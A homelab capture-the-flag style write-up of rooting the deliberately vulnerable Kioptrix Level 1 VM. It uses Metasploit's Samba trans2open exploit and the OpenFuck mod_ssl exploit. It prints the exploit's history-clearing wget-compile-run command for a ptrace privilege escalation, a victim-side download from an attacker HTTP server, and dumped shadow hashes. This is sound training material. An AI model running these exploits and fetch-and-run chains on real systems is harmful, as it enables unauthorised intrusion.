## Kioptrix Level 1

I have recently installed Proxmox in the mini PC I bought to use as a homelab. The main reason I wanted a mini PC was to run VMs from VulnHub to get more experience with VMs, pentesting, self-hosting, etc. 

In this writeup, I will go over how I obtained root (twice!) in Kioptrix 1, the first of a series of vulnerable machines hosted in VulnHub.

## Installation

I had no idea what I was doing here since this Kioptrix machine is quite old (2010; 16 years ago!). 
Here is the article I used that saved me and helped me getting Kioptrix 1 up and running: <a href="https://benheater.com/proxmox-running-kioptrix-level-1/">https://benheater.com/proxmox-running-kioptrix-level-1/</a>

In my personal setup, I have a DHCP server running on Kali for eth2 (not sure if it was really necessary for this machine...). 
The Kioptrix machine is isolated to the eth2 network bridge, which I believe was the intended setup for this challenge. This will be relevant later during my exploitation process.

<img width="891" height="493" alt="image" src="https://github.com/user-attachments/assets/5b18b9f2-64b2-4abf-bbff-5fed15ed492b"/>
<br>

## Enumeration

First, we need to find the IP address of the machine. 
Here are two valid methods to find the IP address. During my initial enumeration, I used `arpscan`. Note that my IP address in eth2 is 10.0.1.5.

```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix]
└─$ nmap 10.0.1.0/24 -sn        
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-27 17:23 MDT
Nmap scan report for 10.0.1.100
Host is up (0.0012s latency).
MAC Address: BC:24:11:54:32:0E (Proxmox Server Solutions GmbH)
Nmap scan report for 10.0.1.5
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 4.03 seconds
                                                                                                                            
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix]
└─$ sudo arp-scan --interface=eth2 -l
Interface: eth2, type: EN10MB, MAC: bc:24:11:b4:13:a7, IPv4: 10.0.1.5
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.1.100      bc:24:11:54:32:0e       (Unknown)

1 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.134 seconds (119.96 hosts/sec). 1 responded
```

Now, let's look deeper into 10.0.1.100 with nmap.
```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix]
└─$ nmap 10.0.1.100 -sV                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-27 17:25 MDT
Nmap scan report for 10.0.1.100
Host is up (0.0047s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp   open  rpcbind     2 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
32768/tcp open  status      1 (RPC #100024)
MAC Address: BC:24:11:54:32:0E (Proxmox Server Solutions GmbH)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.97 seconds

```

I ran a more aggresive scan against these ports, but I didn't really find anything more useful about the services themselves. 
The command I used was `nmap 10.0.1.100 -A -O -p 22,80,111,139,443,32768 -oA scan1`. 
I found that the OS version was `Running: Linux 2.4.X` / `OS details: Linux 2.4.9 - 2.4.18 (likely embedded)`, which demonstrates that the machine appears to be outdated and could be vulnerable to old exploits. 
Additionally, I scanned for all ports using `-p-`, but no other ports were open. The only useful thing for now are the versions of the services running.

## Method 1: Samba Exploitation
Inside the nmap scans, there is no visible version for the Samba service running on port 139. 
Let's look deeper into it with Metasploit. (source: <a href="https://medium.com/@mertbaykal/finding-smb-version-metasploit-5516b4a44a3f">https://medium.com/@mertbaykal/finding-smb-version-metasploit-5516b4a44a3f</a>)

```bash
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > set RHOSTS 10.0.1.100
RHOSTS => 10.0.1.100
msf auxiliary(scanner/smb/smb_version) > run
[*] 10.0.1.100:139        -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 10.0.1.100            - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Great! We know that our Samba version is `Unix (Samba 2.2.1a)`! Let's research some exploits inside Metasploit.

```bash
msf auxiliary(scanner/smb/smb_version) > search samba 2.2
...
2  exploit/linux/samba/trans2open                               2003-04-07       great    No     Samba trans2open Overflow (Linux x86)
```

Let's use the `trans2open` exploit.

```bash
msf auxiliary(scanner/smb/smb_version) > use 2
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf exploit(linux/samba/trans2open) > set RHOSTS 10.0.1.100
RHOSTS => 10.0.1.100
msf exploit(linux/samba/trans2open) > set LHOST eth2
LHOST => 10.0.1.5
msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 10.0.1.5:4444 
[*] 10.0.1.100:139 - Trying return address 0xbffffdfc...
[*] 10.0.1.100:139 - Trying return address 0xbffffcfc...
[*] 10.0.1.100:139 - Trying return address 0xbffffbfc...
[*] 10.0.1.100:139 - Trying return address 0xbffffafc...
[*] Sending stage (1062760 bytes) to 10.0.1.100
[*] 10.0.1.100 - Meterpreter session 1 closed.  Reason: Died
[*] 10.0.1.100:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1062760 bytes) to 10.0.1.100
[*] 10.0.1.100 - Meterpreter session 2 closed.  Reason: Died
[*] 10.0.1.100:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1062760 bytes) to 10.0.1.100
[*] 10.0.1.100 - Meterpreter session 3 closed.  Reason: Died
[*] 10.0.1.100:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1062760 bytes) to 10.0.1.100
[*] 10.0.1.100 - Meterpreter session 4 closed.  Reason: Died
[*] 10.0.1.100:139 - Trying return address 0xbffff6fc...
```
That's odd... Let's try changing to a more generic payload:
```bash
msf exploit(linux/samba/trans2open) > set payload payload/generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 10.0.1.5:4444 
[*] 10.0.1.100:139 - Trying return address 0xbffffdfc...
[*] 10.0.1.100:139 - Trying return address 0xbffffcfc...
[*] 10.0.1.100:139 - Trying return address 0xbffffbfc...
[*] 10.0.1.100:139 - Trying return address 0xbffffafc...
[*] 10.0.1.100:139 - Trying return address 0xbffff9fc...
[*] 10.0.1.100:139 - Trying return address 0xbffff8fc...
[*] 10.0.1.100:139 - Trying return address 0xbffff7fc...
[*] 10.0.1.100:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (10.0.1.5:4444 -> 10.0.1.100:32801) at 2026-03-27 17:39:19 -0600

[*] Command shell session 6 opened (10.0.1.5:4444 -> 10.0.1.100:32802) at 2026-03-27 17:39:20 -0600
[*] Command shell session 7 opened (10.0.1.5:4444 -> 10.0.1.100:32803) at 2026-03-27 17:39:21 -0600
[*] Command shell session 8 opened (10.0.1.5:4444 -> 10.0.1.100:32804) at 2026-03-27 17:39:22 -0600
whoami
root
```

We have **root**!

## Method 2: Apache/OpenSSL Exploitation

There is another way of obtaining root without msfconsole. <br>
Our nmap scans mention another service running on port 443: 
`443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b`

Let's research an exploit to use here.
```bash
└─$ searchsploit mod_ssl 2.8.4
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                      | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                | unix/remote/47080.c
------------------------------------------------------------------------------------------ ---------------------------------
```

I tried compiling the code myself and I failed. This exploit is ancient (2003; 23 years old!!) and it is outdated. 
I looked up an updated version and I found this: https://github.com/heltonWernik/OpenLuck. I simply followed the instructions to set it up on my machine.

```bash
└─$ ./OpenFuck 

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
```

The correct command is `./OpenFuck 0x6b 10.0.1.100 443 -c 50`.

```bash
└─$ ./OpenFuck 0x6b 10.0.1.100 443 -c 50

*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 50 of 50
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
race-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; m/raw/C7v25Xr9 -O pt 
--22:48:22--  https://pastebin.com/raw/C7v25Xr9
           => `ptrace-kmod.c'
Connecting to pastebin.com:443... 
pastebin.com: Host not found.
/usr/lib/gcc-lib/i386-redhat-linux/2.96/../../../crt1.o: In function `_start':
/usr/lib/gcc-lib/i386-redhat-linux/2.96/../../../crt1.o(.text+0x18): undefined reference to `main'
collect2: ld returned 1 exit status
bash: ./p: No such file or directory
bash-2.05$
```

Great! We have user access! However, it seems that the exploit chain wasn't completed? 

### "the Kioptrix machine is isolated to the eth2 network bridge"

Our machine is isolated from the Internet (or Interwebs...) and cannot reach pastebin.com for the next part of the exploit chain. 
I looked deeper into the source code for the exploit and found these lines of code:

```c
#define COMMAND1 "TERM=xterm; export TERM=xterm; exec bash -i\n"
// #define COMMAND2 "unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
#define COMMAND2 "unset HISTFILE; cd /tmp; wget https://pastebin.com/raw/C7v25Xr9 -O ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"
```

With my shell as `apache`, I tried running COMMAND1, which fails and doesn't allow for a cleaner shell with TTY (`bash: no job control in this shell`). 
Going over COMMAND2, I realized that `wget` could be executed by the `apache` user, **the problem was getting the file from pastebin.com!**. 
I needed to get the file from my Kali machine, since it is the only connection it has to the outside world.

First, I need to download the file from pastebin.com on my local machine:
```bash
┌──(kali㉿kali-attacker-0)-[~/BOXES/Kioptrix/Lvl1/OpenFuck]
└─$ wget https://pastebin.com/raw/C7v25Xr9 -O ptrace-kmod.c
--2026-03-27 16:50:52--  https://pastebin.com/raw/C7v25Xr9
Resolving pastebin.com (pastebin.com)... 2606:4700:10::ac42:ab49, 2606:4700:10::6814:1d96, 172.66.171.73, ...
Connecting to pastebin.com (pastebin.com)|2606:4700:10::ac42:ab49|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: ‘ptrace-kmod.c’

ptrace-kmod.c                      [ <=>                                                 ]   3.93K  --.-KB/s    in 0s      

2026-03-27 16:50:53 (10.6 MB/s) - ‘ptrace-kmod.c’ saved [4026]
```

Let's transfer this file with an HTTP server.
```bash
# run on kali
└─$ python3 -m http.server 8080                            
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.0.1.100 - - [27/Mar/2026 16:52:23] "GET /ptrace-kmod.c HTTP/1.0" 200 -

# run on victim
bash-2.05$ wget http://10.0.1.5:8080/ptrace-kmod.c
wget http://10.0.1.5:8080/ptrace-kmod.c
--22:52:22--  http://10.0.1.5:8080/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to 10.0.1.5:8080... connected!
HTTP request sent, awaiting response... 200 OK
Length: 4,026 [text/x-csrc]

    0K ...                                                   100% @   3.84 MB/s

22:52:22 (1.92 MB/s) - `ptrace-kmod.c' saved [4026/4026]
```

Great! Now, let's execute all the bash commands in COMMAND2 manually.
<br>
<img width="755" height="582" alt="image" src="https://github.com/user-attachments/assets/8381f7ff-6275-4458-bb81-9dc097e86b95" />

We have **root**!

## Other Findings
`cat /etc/shadow` reveals hashes for root and other two users. I tried cracking them with rockyou.txt but I was unlucky.

```text
root:$1$XROmcfDX$tF93GqnLHOJeGRHpaNyIs0:14513:0:99999:7:::
john:$1$zL4.MR4t$26N4YpTGceBO0gTX6TAky1:14513:0:99999:7:::
harold:$1$Xx6dZdOd$IMOGACl3r757dv17LZ9010:14513:0:99999:7:::
```

Original hostname:

```bash
hostname
kioptrix.level1
```

It seems the machine is keeping logs of my actions... 
Here's the logs for my failed RPC enumeration (I found nothing so I didn't mention it).
```bash
ls /var/log/samba
kali-attacker-0.log
log.nmbd
log.smbd
nmap.log
smbd.log
smbd.log.1
cat /var/log/samba/kali-attacker-0.log
[2026/03/27 18:47:15, 0] smbd/service.c:make_connection(238)
  kali-attacker-0 (10.0.1.5) couldn't find service /ipc$
[2026/03/27 18:47:23, 0] smbd/service.c:make_connection(238)
  kali-attacker-0 (10.0.1.5) couldn't find service /admin$
[2026/03/27 18:47:44, 0] passdb/smbpass.c:startsmbfilepwent_internal(87)
  startsmbfilepwent_internal: unable to open file /etc/samba/smbpasswd. Error was No such file or directory
[2026/03/27 18:47:44, 0] rpc_server/srv_samr_nt.c:get_sampwd_entries(79)
  get_sampwd_entries: Unable to open SMB password database.
  ...
```

Commands ran by root before me:  
```bash
cat /root/.bash_history
ls
mail
mail
clear
echo "ls" > .bash_history && poweroff
nano /etc/issue
pico /etc/issue
pico /etc/issue
ls
clear
ls /home/
exit
ifconfig
poweroff

mail
Mail version 8.1 6/6/93.  Type ? for help.
"/var/mail/root": 2 messages 1 new 2 unread
```

If this was a regular CTF challenge, the flag would be here. I believe this counts as the flag.<br>
<img width="655" height="281" alt="image" src="https://github.com/user-attachments/assets/967ef9cc-018a-4df5-9cec-323ae36c09a9" />

The `/etc/issue` file contains the message shown in the login screen when we start the Kioptrix machine.
I can change it with my own file (`wget http://10.0.1.50:8080/new_msg.txt` and `mv new_msg.txt /etc/issue`) to display my own message : ) .
<br>
<img width="893" height="492" alt="image" src="https://github.com/user-attachments/assets/76e77129-4ac7-4009-82c5-819f8f032bfe" />
<br>
※ This is the end of this writeup. Hope I can continue writing about this series of VMs!


